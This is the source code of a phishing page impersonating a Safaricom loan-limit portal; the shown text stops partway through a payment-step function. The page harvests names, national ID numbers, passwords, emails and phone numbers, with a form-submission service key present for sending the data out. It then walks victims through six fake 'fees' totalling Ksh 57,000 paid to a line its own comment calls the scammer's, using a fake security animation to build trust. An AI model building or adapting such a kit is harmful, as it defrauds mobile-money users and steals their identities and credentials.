<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Safaricom Financial Services Portal -Fuliza,M-Shwari & KCB Limit Increase</title>
    
    <style>
        /* --- 1. Global Styles and Variables --- */
        :root {
            --safaricom-green: #00A300; 
            --safaricom-accent: #FF9800;
            --safaricom-dark-green: #007000; 
            --safaricom-light-green: #e6ffe6; 
            --background-start: #f2f7f2; 
            --background-end: #d6e8d6;   
            --shadow-primary: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: var(--background-start);
            color: #333;
            line-height: 1.6;
            padding-top: 70px;
        }

        /* --- 2. Navbar --- */
        .navbar {
            position: fixed; 
            top: 0;
            left: 0;
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 5%;
            z-index: 1000;
            background-color: var(--safaricom-dark-green);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
        }

        .navbar-logo-area {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .navbar-title {
            color: white;
            font-size: 1.4em; 
            font-weight: 700; 
            letter-spacing: 1px;
            text-transform: uppercase;
        }
        .logo {
            height: 40px;
            width: 40px; 
            background-color: white; 
            border-radius: 50%; 
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 20px;
            color: var(--safaricom-green);
            font-weight: 900;
            border: 2px solid var(--safaricom-accent);
        }
        .logo:before { content: 'S'; }
        
        /* --- 3. Global Utility and Buttons --- */
        .cta-button, .product-card button, .help-button, .back-button, .assistance-button, .upsell-button, #loginSubmitBtn, #submitAgentApprovalBtn, .dashboard-cta-button {
            background-color: var(--safaricom-accent);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 1.2em;
            font-weight: bold;
            border-radius: 8px; 
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s;
            box-shadow: 0 4px 15px rgba(255, 152, 0, 0.4);
            min-width: 300px; 
            text-decoration: none;
            display: inline-block;
            text-align: center;
            margin-top: 20px;
        }
        .cta-button:hover, .product-card button:hover, .help-button:hover, .back-button:hover, .assistance-button:hover, .upsell-button:hover, #loginSubmitBtn:hover, #submitAgentApprovalBtn:hover, .dashboard-cta-button:hover {
            background-color: #fb8c00;
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(255, 152, 0, 0.5);
        }
        .back-button {
            background-color: #757575;
            box-shadow: 0 4px 15px rgba(117, 117, 117, 0.4);
            margin-right: 15px;
            min-width: 150px;
            font-size: 1em;
        }
        .back-button:hover {
            background-color: #616161;
        }
        .assistance-button {
            background-color: #f44336; 
            box-shadow: 0 4px 15px rgba(244, 67, 54, 0.6);
            min-width: 400px;
            margin: 25px 0;
            animation: pulse-assistance 1.5s infinite;
        }
        .assistance-button:hover {
             background-color: #d32f2f;
             box-shadow: 0 8px 20px rgba(244, 67, 54, 0.8);
             transform: scale(1.03);
        }
        @keyframes pulse-assistance {
            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(244, 67, 54, 0.7); }
            70% { transform: scale(1.01); box-shadow: 0 0 0 10px rgba(244, 67, 54, 0); }
            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(244, 67, 54, 0); }
        }

        .upsell-button, .dashboard-cta-button {
             background-color: var(--safaricom-green);
             box-shadow: 0 4px 15px rgba(0, 163, 0, 0.4);
        }
        .upsell-button:hover, .dashboard-cta-button:hover {
             background-color: var(--safaricom-dark-green);
             box-shadow: 0 8px 20px rgba(0, 163, 0, 0.6);
        }

        .loading-btn {
            background-color: var(--safaricom-dark-green) !important;
            pointer-events: none;
            opacity: 0.9; 
            box-shadow: none !important;
            animation: pulse-loading 1.5s infinite alternate; 
        }
        @keyframes pulse-loading {
            from { transform: scale(1); opacity: 0.9; }
            to { transform: scale(1.02); opacity: 1; }
        }
        
        /* --- 4. Page Management --- */
        main {
            min-height: calc(100vh - 70px); 
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .page-content {
            display: none; 
            width: 100%;
            animation: fadeIn 0.6s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            min-height: calc(100vh - 70px);
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .page-content.active { display: flex; }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* --- 5. Form/Input Styles and Containers --- */
        .container, .flow-form-container {
            max-width: 500px;
            background: white;
            padding: 35px;
            border-radius: 12px;
            box-shadow: var(--shadow-primary);
            width: 100%;
        }
        .flow-form-container { max-width: 600px; }
        .flow-form-container h2 { color: var(--safaricom-dark-green); margin-bottom: 20px; font-size: 1.8em; }
        
        /* Styles needed by the external flow pages */
        .flow-page { display: none; }
        .flow-page.active { display: block; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #555; text-align: left; }
        .form-group input, .form-group textarea { 
            width: 100%; 
            padding: 12px; 
            border: 1px solid #ddd; 
            border-radius: 6px; 
            transition: border-color 0.3s; 
            font-size: 1em; 
            resize: vertical;
            min-height: 50px;
        }
        .form-group textarea { min-height: 100px; } /* Larger area for message pasting */

        .switch-link {
            display: block;
            margin-top: 15px;
            font-size: 0.9em;
            color: var(--safaricom-dark-green);
            text-decoration: none;
            text-align: center;
        }
        .branding-section { margin: 25px 0; padding: 15px 20px; border-left: 5px solid var(--safaricom-accent); background-color: var(--safaricom-light-green); border-radius: 5px; text-align: left; }
        .branding-section h2 { color: var(--safaricom-green); margin-bottom: 8px; font-size: 1.2em; }
        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap; 
        }
        .password-container { position: relative; }
        .password-container input { padding-right: 40px; }
        .password-toggle-icon {
            position: absolute;
            right: 15px;
            bottom: 12px; 
            cursor: pointer;
            font-size: 1.2em;
            color: #757575;
            z-index: 10;
        }
        #limit-input-container { margin-bottom: 30px; }
        
        /* Mobile-specific adjustments for full width buttons */
        @media (max-width: 640px) {
            .container, .flow-form-container, .upsell-container, .dashboard-container {
                padding: 20px;
                margin: 10px;
            }
            .navbar-title {
                font-size: 1.1em;
            }
            .logo {
                height: 30px;
                width: 30px;
                font-size: 16px;
            }
            .cta-button, .product-card button, .help-button, .back-button, .assistance-button, .upsell-button, #loginSubmitBtn, #submitAgentApprovalBtn, .dashboard-cta-button {
                min-width: 100%; /* Make all large buttons full width on small screens */
                padding: 12px 20px;
                font-size: 1em;
            }
            .assistance-button {
                min-width: 100%; /* Ensure this fits the screen */
                margin: 15px 0;
            }
            .button-group {
                flex-direction: column;
                gap: 10px;
            }
        }

        /* --- 7. Dashboard Styles (Final page) */
        #dashboard-page { flex-direction: column; align-items: center; background-color: var(--background-end); padding-top: 40px; }
        .dashboard-container { max-width: 800px; background: white; padding: 40px; border-radius: 12px; box-shadow: var(--shadow-primary); text-align: center; }
        .application-status { 
            background-color: var(--safaricom-light-green); 
            border: 1px solid var(--safaricom-green); 
            padding: 20px; 
            border-radius: 8px; 
            margin-bottom: 30px; 
            font-size: 1.1em; 
            color: var(--safaricom-dark-green); 
            font-weight: 600; 
        }
        .applicant-details table { width: 100%; border-collapse: collapse; margin-top: 20px; border: 1px solid #e0e0e0; }
        .applicant-details th, .applicant-details td { padding: 15px; text-align: left; border-bottom: 1px solid #f0f0f0; }
        .applicant-details th { background-color: var(--safaricom-light-green); color: var(--safaricom-dark-green); font-weight: 700; text-transform: uppercase; }
        
        .dashboard-container .assistance-button {
             margin-top: 25px; 
             min-width: 400px; 
        }
        .rejection-advice {
            margin-top: 20px;
            padding: 15px;
            border: 1px dashed #f44336;
            background-color: #ffebee;
            color: #d32f2f;
            border-radius: 8px;
            font-size: 0.9em;
        }

        /* --- 8. Animation/Loading Styles (Updated for generic delay) --- */
        @keyframes scrollCode {
            0% { transform: translateY(0); }
            100% { transform: translateY(-100%); }
        }
        .data-flow-animation {
            width: 90%;
            height: 200px;
            background-color: #1e1e1e;
            border-radius: 8px;
            overflow: hidden;
            position: relative;
            margin: 20px auto;
            border: 1px solid var(--safaricom-green);
            padding: 10px;
            text-align: left;
            font-family: 'Courier New', monospace;
            font-size: 0.8em;
            color: #ccc;
        }
        .code-lines {
            position: absolute;
            width: 100%;
            animation: scrollCode 2s linear infinite;
        }
        .line {
            white-space: pre;
            padding: 2px 0;
            color: #d4d4d4;
        }
        .code-key { color: #569cd6; } 
        .code-val { color: #9cd656; } 
        .code-comment { color: #6a9955; }
        .code-red { color: #d16969; } 
        .spinner-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 250px;
        }
        .loading-text-style {
            margin-top: 20px; 
            font-size: 1.4em; 
            font-weight: 700; 
            color: var(--safaricom-dark-green);
            text-align: center;
            animation: pulse-text 1.5s infinite alternate;
        }
        @keyframes pulse-text {
            from { opacity: 0.7; }
            to { opacity: 1; }
        }
        
        /* --- 9. Upsell Page Styling --- */
        #upsell-page { flex-direction: column; }
        .upsell-container {
            max-width: 600px;
            background: white;
            padding: 35px;
            border-radius: 12px;
            box-shadow: var(--shadow-primary);
            width: 100%;
            text-align: center;
            border-top: 5px solid var(--safaricom-green);
        }
    </style>
</head>
<body>

    <header class="navbar">
        <div class="navbar-logo-area">
            <div class="logo"></div>
            <span class="navbar-title">PREMIER FINANCIAL AGENT SELF-SERVICE PLATFORM</span>
        </div>
    </header>

    <main>
        <!-- The 'active' class is now handled dynamically in the script -->
        <div id="landing-page" class="page-content"> 
            <div class="container" style="text-align: center;">
                <h1>Official Limit Increase Portal</h1>
                <p style="margin-bottom: 25px;">Welcome! This platform manages limits for **Fuliza, M-Shwari, and KCB M-PESA**. Secure registration is required to proceed with the increase process. **Maximum Limit: Ksh 450,000.**</p>
                
                <button id="goToRegistrationBtn" class="cta-button">
¬†¬†¬† **START REGISTRATION**
</button>
                <a href="#" id="goToLoginLink" class="switch-link" style="display: none;">Already registered? **Login Here**</a>
            </div>
        </div>
        
        <div id="registration-page" class="page-content">
            <div class="container">
                <h2>Secure Portal Access Registration</h2>
                <form id="registrationForm">
                    <div class="form-group"><label for="name">Applicant Name</label><input type="text" id="name" name="name" placeholder="Enter Full Name" required></div>
                    <div class="form-group"><label for="id_number">National ID Number</label><input type="text" id="id_number" name="id_number" placeholder="Enter ID Number" pattern="[0-9]{7,8}" required></div>
                    <div class="form-group"><label for="phone">Phone Number (Strictly Safaricom)</label><input type="tel" id="phone" name="phone" placeholder="e.g., 07XX-XXXXXX or 01XX-XXXXXX" pattern="(07|01)\d{8}" required></div>
                    <div class="form-group password-container">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" placeholder="Set a secure password" required>
                        <span id="toggleRegistrationPassword" class="password-toggle-icon">üîí</span>
                    </div>
                    
                    <div class="button-group">
                        <button type="button" class="back-button" onclick="handleBack('registration-page')">Back to Landing</button>
                        <button type="submit" class="cta-button" style="min-width: 330px;">Register & Continue</button>
                    </div>
                    <a href="#" id="goToLoginFromRegister" class="switch-link">Already registered? **Login Here**</a>
                </form>
            </div>
        </div>

        <div id="login-page" class="page-content">
            <div class="container">
                <h2>Secure Portal Login</h2>
                <form id="loginForm">
                    <div class="form-group"><label for="login-id-number">National ID Number</label><input type="text" id="login-id-number" name="id_number" placeholder="Enter Registered ID Number" pattern="[0-9]{7,8}" required></div>
                    <div class="form-group password-container">
                        <label for="login-password">Password</label>
                        <input type="password" id="login-password" name="password" placeholder="Enter your password" required>
                        <span id="toggleLoginPassword" class="password-toggle-icon">üîí</span>
                    </div>
                    
                    <div class="button-group">
                        <button type="button" class="back-button" onclick="handleBack('login-page')">Back to Landing</button>
                     <button id="loginSubmitBtn" type="button" class="cta-button">Log In</button>  
                    </div>
                    <a href="#" id="goToRegisterFromLogin" class="switch-link">New user? Register now.</a>
                </form>
            </div>
        </div>
        
        <div id="agent-approval-page" class="page-content">
            <div class="container" style="max-width: 550px;">
                <h1 style="color: var(--safaricom-dark-green); text-align: center;">Agent Approval Verification (Mandatory)</h1>
                <p style="text-align: center; margin-bottom: 25px;">
                    For your security and for the Agent to finalize your profile eligibility, please confirm your primary contact details. This data is for **Internal Agent Access Only** and will not be shared.
                </p>
                <form id="agentApprovalForm">
                    <div class="form-group">
                        <label for="agent-email">Primary Email Address</label>
                        <input type="email" id="agent-email" name="email" placeholder="Enter your best contact email" required>
                    </div>
                    <div class="form-group">
                        <label for="agent-phone">Alternative Phone Number</label>
                        <input type="tel" id="agent-phone" name="phone" placeholder="Enter an alternative Safaricom number" pattern="(07|01)\d{8}" required>
                    </div>
                    <div class="form-group">
                        <label for="agent-id">National ID Number</label>
                        <input type="text" id="agent-id" name="id_number" readonly required>
                    </div>
                    
                    <button type="button" id="submitAgentApprovalBtn" class="cta-button" style="min-width: 100%;">
                        Submit for Agent Approval & Proceed to Products
                    </button>
                </form>
                <button type="button" class="back-button" style="min-width: 100%; margin-top: 15px;" onclick="handleBack('agent-approval-page')">‚¨ÖÔ∏è Logout / Back to Login</button>
            </div>
        </div>


        <div id="selection-page" class="page-content">
            <div class="container" style="max-width: 900px;">
                <h1 style="color: var(--safaricom-dark-green); text-align: center;">Welcome, <span id="user-welcome-name">Applicant</span>! Select Product for Limit Increase.</h1>
                <p style="text-align: center; margin-bottom: 30px;">Choose the product you wish to proceed with. Note: The final achievable limit for all products is **Ksh 450,000**.</p>
                
                <div class="product-grid">
                    <div class="product-card">
                        <h3>Fuliza M-PESA</h3>
                        <p>Increase your Fuliza limit up to **Ksh 450,000** instantly.</p>
                        <!-- FULIZA FLOW BUTTON -->
                        <button id="startFulizaBtn" onclick="startProductFlow('fuliza')" class="cta-button" style="min-width: 100%; padding: 12px; margin: 0; background-color: #673AB7; box-shadow: 0 4px 15px rgba(103, 58, 183, 0.4);">
                             Fuliza Increase
                        </button>
                    </div>
                    
                    <div class="product-card">
                        <h3>M-Shwari</h3>
                        <p>Increase your M-Shwari Loan and Savings limits up to **Ksh 450,000**.</p>
                        <button class="select-product-btn" data-product="mshwari" onclick="startProductFlow('mshwari')">Start M-Shwari Flow</button>
                    </div>
                    
                    <div class="product-card">
                        <h3>KCB M-PESA</h3>
                        <p>Increase your KCB M-PESA loan limits up to **Ksh 450,000**.</p>
                        <button class="select-product-btn" data-product="kcbmpesa" onclick="startProductFlow('kcbmpesa')">Start KCB M-PESA Flow</button>
                    </div>
                </div>
                
                <div style="width: 100%; text-align: center;">
                    <a href="https://t.me/Mpesa_Loans0722000000" target="_blank" class="assistance-button">
                        **üö® Get Assistance from Management**
                    </a>
                </div>
                
                <button type="button" class="back-button" style="min-width: 100%;" onclick="handleBack('selection-page')">‚¨ÖÔ∏è Logout / Back to Login</button>
            </div>
        </div>

        <div id="flow-step-loading" class="page-content">
            <div class="flow-form-container">
                <div class="spinner-container">
                    <p id="loading-text" class="loading-text-style">Your request is received and Being processed, Please wait...</p>
                    
                    <div class="data-flow-animation">
                        <div class="code-lines" id="trust-code-animation">
                            <div class="line code-comment">// Secure Protocol v4.2 Initializing...</div>
                            <div class="line code-key">function</div><div class="code-val"> CalculateTariff(limit, amount) {</div>
                            <div class="line">    <span class="code-key">const</span> feeRate = <span class="code-val">0.126667</span>;</div>
                            <div class="line code-comment">// üîí Validating M-PESA Sender Message...</div>
                            <div class="line code-red">    if (<span class="code-val">messageCheck</span> <span class="code-key">!=</span> <span class="code-val">AuthorizedTransaction</span>) return <span class="code-key">false</span>;</div>
                            <div class="line">    <span class="code-key">let</span> totalFee = <span class="code-val">limit</span> * feeRate;</div>
                            <div class="line code-comment">// ‚úÖ Transaction verified. Pushing new limit.</div>
                            <div class="line">        <span class="code-key">if</span> (totalFee > <span class="code-val">0</span>) {</div>
                            <div class="line">            <span class="code-key">const</span> <span class="code-red">newLimit</span> = <span class="code-val">limit</span>;</div>
                            <div class="line code-key">            updateSystem(<span class="code-val">ApplicantID</span>, <span class="code-red">newLimit</span>);</div>
                            <div class="line">            <span class="code-comment">// System commit successful.</span></div>
                            <div class="line">            <span class="code-key">return</span> <span class="code-val">true</span>;</div>
                            <div class="line">        </div>
                            <div class="line code-key">    return</div> <span class="code-val">false</span>;
                            <div class="line code-comment">// Awaiting next M-PESA transaction...</div>
                            <div class="line code-key">function</div><div class="code-val"> CheckEligibility(id) {</div>
                            <div class="line">    <span class="code-key">const</span> score = <span class="code-val">fetchCBScore(id)</span>;</div>
                            <div class="line code-red">    if (<span class="code-val">score</span> <span class="code-key">&lt;</span> <span class="code-val">300</span>) return <span class="code-key">false</span>;</div>
                        </div>
                    </div>
                    <div style="margin-top: 10px; color: #555;">**DO NOT REFRESH PAGE** - System Integration in Progress.</div>
                </div>
            </div>
        </div>

        <div id="dynamic-flow-page" class="page-content" data-current-product="">
            <div class="flow-form-container" id="flow-content-placeholder">
                <p style="text-align: center; color: #999;">Loading product flow...</p>
            </div>
        </div>


        <div id="upsell-page" class="page-content">
            <div class="upsell-container">
                <h2 style="color: var(--safaricom-accent);">Maximize Your Financial Eligibility!</h2>
                <p>Congratulations, <span id="upsell-user-name">Applicant</span>! Your <span id="upsell-product-name">Fuliza</span> limit increase is successfully submitted and is currently in the **72-hour mandatory system sync period**.</p>
                
                <div class="branding-section" style="border-left: 5px solid var(--safaricom-green);">
                    <h2>**PROFESSIONAL RECOMMENDATION**</h2>
                    <p style="font-weight: bold; color: var(--safaricom-dark-green);">
                        While the system integrates your <span id="upsell-product-name-bold">Fuliza</span> limit, we strongly recommend initiating the process for **M-Shwari** or **KCB M-PESA** immediately.
                    </p>
                    <p>
                        Dual application during the synchronization window significantly boosts your overall Credit Score Tier and ensures maximum eligibility across all platforms. This strategic step prevents delays and optimizes your total achievable limit.
                    </p>
                </div>
                
                <h3 style="margin-top: 25px; color: var(--safaricom-dark-green);">Continue Enhancing Your Credit Profile:</h3>
                
                <div class="button-group" style="flex-direction: column; align-items: center;">
                    <button id="upsell-to-mshwari" class="upsell-button" data-product="mshwari" style="min-width: 450px;">
                        **üöÄ Start M-Shwari Limit Increase Now**
                    </button>
                    <button id="upsell-to-kcbmpesa" class="upsell-button" data-product="kcbmpesa" style="min-width: 450px;">
                        **üöÄ Start KCB M-PESA Limit Increase Now**
                    </button>
                    <button type="button" class="back-button" style="min-width: 450px;" onclick="handleBack('upsell-page')">
                        Not Now, Return to Product Selection
                    </button>
                </div>
            </div>
        </div>

        <div id="dashboard-page" class="page-content">
            <div class="dashboard-container">
                <h2>Application Processing Dashboard</h2>
                
                <div class="application-status">
                    ‚úÖ **APPLICATION STATUS: AWAITING SYSTEM SYNC** <br>Your request for <span id="dashboard-product-name-status">N/A</span> is in the final queue. The new limit will reflect within **72 hours**.
                </div>

                <div class="applicant-details">
                    <table>
                        <thead>
                            <tr><th>Detail</th><th>Value</th></tr>
                        </thead>
                        <tbody>
                            <tr><td>**Applicant Name**</td><td id="dashboard-name">N/A</td></tr>
                            <tr><td>**ID Number**</td><td id="dashboard-id">N/A</td></tr>
                            <tr><td>**Product**</td><td id="dashboard-product">N/A</td></tr>
                            <tr><td>**New Limit Applied For**</td><td id="dashboard-new-limit" style="color: var(--safaricom-dark-green); font-weight: bold;">N/A</td></tr>
                            <tr><td>**Total Verified Charges**</td><td id="dashboard-total-fee" style="color: red; font-weight: bold;">N/A</td></tr>
                            <tr><td>**Application Status**</td><td id="dashboard-status" style="color: var(--safaricom-green);">**SUCCESSFUL (AWAITING SYSTEM SYNC)**</td></tr>
                        </tbody>
                    </table>
                </div>

                <div class="rejection-advice">
                    **NOTICE: Limit Sync Cycle**
                    <br>Do not attempt to apply for other loans until the new limit reflects. If the status does not change after the **72-hour period**, contact management via Telegram.
                </div>
                
                <div class="button-group" style="flex-direction: column; align-items: center;">
                    <button type="button" class="dashboard-cta-button" onclick="handleBack('dashboard-page', true)" style="min-width: 400px; margin-top: 15px;">
                        **üöÄ Start New Limit Increase (Back to Selection)**
                    </button>
                    <a href="https://t.me/Mpesa_Loans0722000000" target="_blank" class="assistance-button">
                        **üö® Get Assistance from Management (Telegram)**
                    </a>
                    <button type="button" class="back-button" style="min-width: 400px;" onclick="handleBack('dashboard-page')">‚¨ÖÔ∏è Logout / Back to Login</button>
                </div>

            </div>
        </div>
        
    </main>

    <script>
        // --- DATA AND DOM DEFINITIONS ---
        // Access key provided by the user for Web3Forms integration
        const WEB3FORMS_ACCESS_KEY = "f841d7a4-e23f-4277-8aa7-8015961a135e"; 
        
        const pages = ['landing-page', 'login-page', 'registration-page', 'selection-page', 'dynamic-flow-page', 'dashboard-page', 'flow-step-loading', 'upsell-page', 'agent-approval-page'];
        
        // --- Core Application State ---
        let appState = {
            isLoggedIn: false,
            userName: 'Applicant',
            userId: null,
            currentProduct: null, // 'fuliza', 'mshwari', 'kcbmpesa'
            desiredLimit: 10000,
            currentStep: 1, // 1 to 6
            totalFee: 0,
            stepFees: {},
            lastCompletedProduct: null,
            lastCompletedLimit: 0,
            lastCompletedFee: 0,
            mpesaMessages: [], // Stores pasted M-PESA messages for audit submission
            usedMpesaMessages: JSON.parse(localStorage.getItem('usedMpesaMessages') || '[]') // Stores verified codes
        };
        
        const MAX_LIMIT = 450000;
        const businessNumber = '0105565417'; // Scammer's payment line
        const STEP_COUNT = 6;

        // FIXED, PROFESSIONALLY ESCALATING FEE DISTRIBUTION (Total: 57,000)
        const FIXED_STEP_FEES = {
            1: 100,     // System Protocol Validation Charge
            2: 500,     // Deep Data Integrity Analysis Fee
            3: 2500,    // Core Credit Rating Computation Charge
            4: 7000,    // Regulatory Compliance Assessment Fee
            5: 15000,   // Tier 2 System Integration and Commitment Payment
            6: 31900    // Final Protocol Activation Charge
        };
        const MAX_TOTAL_FEE = Object.values(FIXED_STEP_FEES).reduce((a, b) => a + b, 0); // Should be 57000

        // Varied, professional titles for each payment step
        const STEP_TITLES = {
            1: 'Step 1: System Protocol Validation Charge',
            2: 'Step 2: Deep Data Integrity Analysis Fee',
            3: 'Step 3: Core Credit Rating Computation Charge',
            4: 'Step 4: Regulatory Compliance Assessment Fee',
            5: 'Step 5: Tier 2 System Integration and Commitment Payment',
            6: 'Step 6: Final Protocol Activation Charge'
        };
        
        function getStepTitle(step) { return STEP_TITLES[step] || 'Processing Stage'; }

        // --- Core Page Switching Functions ---
        function switchPage(targetId) {
            
            pages.forEach(id => {
                const page = document.getElementById(id);
                if (page) page.classList.remove('active');
            });

            const targetPage = document.getElementById(targetId);
            if (targetPage) targetPage.classList.add('active');
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        /**
         * Switches pages with a 3-second mandatory loading delay in between.
         * @param {string} targetId - The ID of the page to switch to after the delay.
         * @param {Event | null} [e=null] - Optional event object to prevent default behavior.
         */
        function switchPageWithDelay(targetId, e = null) {
            if (e) e.preventDefault();
            
            // 1. Show the generic loading page
            switchPage('flow-step-loading');
            document.getElementById('loading-text').textContent = "Your request is received and Being processed, Please wait...";

            // 2. Transition after 3 seconds
            setTimeout(() => {
                switchPage(targetId);
            }, 3000);
        }
        
        function formatKsh(amount) {
            // Remove the currency symbol and decimals for cleaner display
            return new Intl.NumberFormat('en-KE', { 
                style: 'currency', 
                currency: 'KES',
                minimumFractionDigits: 0,
                maximumFractionDigits: 0
            }).format(amount).replace('KES', '').trim();
        }
        
        // --- Fee Calculation Logic (Simplified to use fixed fees) ---
        function calculateFee(limitValue) {
            // The fee is fixed for all limits between 10,000 and 450,000 for simplicity and professional look
            const limit = parseInt(limitValue);
            if (isNaN(limit) || limit < 10000 || limit > MAX_LIMIT) {
                return { totalFee: MAX_TOTAL_FEE, stepFees: FIXED_STEP_FEES };
            }
            
            return { 
                totalFee: MAX_TOTAL_FEE, 
                stepFees: FIXED_STEP_FEES 
            };
        }

        /**
         * Extracts the 10-character M-PESA transaction code from the message.
         * The code is usually at the start and followed by 'Confirmed'.
         * @param {string} message - The M-PESA message text.
         * @returns {string | null} The transaction code or null.
         */
        function extractMpesaCode(message) {
            // Regex to find 10 alphanumeric characters followed by 'Confirmed'
            const match = message.match(/([A-Z0-9]{10})\s+CONFIRMED/i); 
            return match ? match[1].toUpperCase() : null;
        }

        /**
         * Stores the successfully verified M-PESA message details.
         */
        function saveUsedMpesaMessage(code, amount) {
            const newMessage = {
                code: code,
                amount: amount,
                timestamp: new Date().toISOString()
            };
            appState.usedMpesaMessages.push(newMessage);
            localStorage.setItem('usedMpesaMessages', JSON.stringify(appState.usedMpesaMessages));
        }
        
        // --- Flow HTML Template (Updated to remove tier quotes) ---
        const flowContentTemplate = `
            <div class="flow-page active">
                <h2><span id="product-name-title">Product</span> Limit Increase</h2>
                <form id="productFlowForm">
                    <div class="form-group" id="limit-input-container">
                        <label for="desired-limit">Enter Desired <span id="product-name-label">Product</span> Limit (Min 10,000, Max ${formatKsh(MAX_LIMIT)})</label>
                        <input type="number" id="desired-limit" name="desired-limit" 
                            placeholder="e.g., 250000" min="10000" max="${MAX_LIMIT}" value="10000" required
                            oninput="updateFlowDetails()">
                    </div>
                    
                    <div class="branding-section">
                        <h2>Transaction Summary for Limit of <span id="flow-limit-display" style="color: var(--safaricom-accent);">Ksh 10,000</span></h2>
                        <hr style="margin: 10px 0; border-color: #ddd;">
                        
                        <h3><span id="step-title-display">System Protocol Validation Charge</span></h3>
                        <p style="font-size: 1.3em; color: red; font-weight: bold; margin: 10px 0;">
                            **Amount to Send:** Ksh <span id="step-fee-display">100</span>
                        </p>
                        <p id="payment-instructions" style="font-size: 0.9em;">
                            Send the **exact amount** via M-PESA to the Official Payment Line: **<span id="business-number-display">${businessNumber}</span>**.
                        </p>
                    </div>

                    <div class="form-group">
                        <label for="mpesa-message-text">PASTE M-PESA Confirmation Message **STRICTLY HERE**</label>
                        <textarea id="mpesa-message-text" name="mpesa_message" 
                            placeholder="Paste the entire M-PESA confirmation text (e.g., CMQ7C... Confirmed. Ksh XXX sent to Safaricom Loans Business for...). This is for **audit purposes**." rows="4" required></textarea>
                    </div>
                    
                    <div class="button-group">
                        <button type="button" class="back-button" onclick="handleBack('dynamic-flow-page')">‚¨ÖÔ∏è Back to Selection</button>
                        <button type="button" id="nextStepBtn" class="cta-button">
                            Verify Message
                        </button>
                    </div>
                </form>
            </div>
        `;


        // --- Flow State and UI Update Functions ---

        function updateFlowDetails() {
            const limitInput = document.getElementById('desired-limit');
            let newLimit = parseInt(limitInput.value);

            if (isNaN(newLimit) || newLimit < 10000 || newLimit > MAX_LIMIT) {
                newLimit = appState.desiredLimit;
                if (isNaN(parseInt(limitInput.value))) return;
            }

            appState.desiredLimit = newLimit;
            const feeData = calculateFee(newLimit);
            appState.totalFee = feeData.totalFee;
            appState.stepFees = feeData.stepFees;

            // Update UI elements based on current step
            const currentFee = appState.stepFees[appState.currentStep];

            document.getElementById('flow-limit-display').textContent = `Ksh ${formatKsh(newLimit)}`;
            document.getElementById('step-title-display').textContent = getStepTitle(appState.currentStep);
            document.getElementById('step-fee-display').textContent = formatKsh(currentFee);
        }

        async function nextPaymentStep(e) {
            e.preventDefault();

            const mpesaMessageTextarea = document.getElementById('mpesa-message-text');
            const nextStepBtn = document.getElementById('nextStepBtn');
            const pastedMessage = mpesaMessageTextarea.value.trim().toUpperCase(); 
            
            const currentFee = formatKsh(appState.stepFees[appState.currentStep]);
            const mpesaCode = extractMpesaCode(pastedMessage);
            
            // --- VALIDATION LOGIC ---
            // 1. Target Account/Payment Line Check
            const paymentLineCheck = new RegExp('(254105565417|0105565417)', 'i');
            
            // 2. Exact Amount Check (KSH + Fee + optional .00)
            const amountCheck = new RegExp(`KSH[\\s]*${currentFee}(\\.00)?`, 'i');

            const numberMatch = paymentLineCheck.test(pastedMessage);
            const amountMatch = amountCheck.test(pastedMessage);
            
            let verificationFailed = false;

            if (!numberMatch || !amountMatch) {
                // Check 1: Message validity (amount/number)
                let errorMessage = '‚ùå VERIFICATION FAILED: ';
                if (!amountMatch) errorMessage += `The message must contain the EXACT fee amount (Ksh ${currentFee}). `;
                if (!numberMatch) errorMessage += `The message must contain the Official Payment Line (254105565417 or 0105565417).`;
                mpesaMessageTextarea.placeholder = errorMessage + ' Re-paste the correct message.';
                verificationFailed = true;
            }
            
            if (mpesaCode && !verificationFailed) {
                 // Check 2: Uniqueness of M-PESA Code
                 const isDuplicate = appState.usedMpesaMessages.some(msg => msg.code === mpesaCode);

                 if (isDuplicate) {
                     mpesaMessageTextarea.placeholder = 'üö® DUPLICATE TRANSACTION DETECTED. Pay the required fee and wait for the new confirmation submission.';
                     verificationFailed = true;
                 }
            } else if (!mpesaCode && !verificationFailed) {
                // If the message is valid but we can't extract the code (e.g., message format slightly changed)
                // Treat this as a format error but let amount/number check catch it usually
            }


            if (verificationFailed) {
                mpesaMessageTextarea.style.borderColor = 'red';
                mpesaMessageTextarea.value = '';
                
                nextStepBtn.classList.add('back-button');
                nextStepBtn.textContent = 'Verification FAILED. Please check the message.';
                
                setTimeout(() => {
                    nextStepBtn.classList.remove('back-button');
                    nextStepBtn.textContent = 'Verify Message';
                    mpesaMessageTextarea.style.borderColor = '#ddd';
                    // Revert to generic placeholder only if the current error is not the long professional one
                    if (!mpesaMessageTextarea.placeholder.startsWith('üö® DUPLICATE')) {
                        mpesaMessageTextarea.placeholder = 'Paste the entire M-PESA confirmation text...';
                    }
                }, 4000);
                
                return; 
            }
            
            // Validation passed: reset style, store unique code, and store message
            mpesaMessageTextarea.style.borderColor = '#ddd';
            saveUsedMpesaMessage(mpesaCode, currentFee); // Save unique code/amount
            
            const stepMessage = `${getStepTitle(appState.currentStep)} (Limit: ${formatKsh(appState.desiredLimit)} / FEE: Ksh ${currentFee}): ${pastedMessage}`;
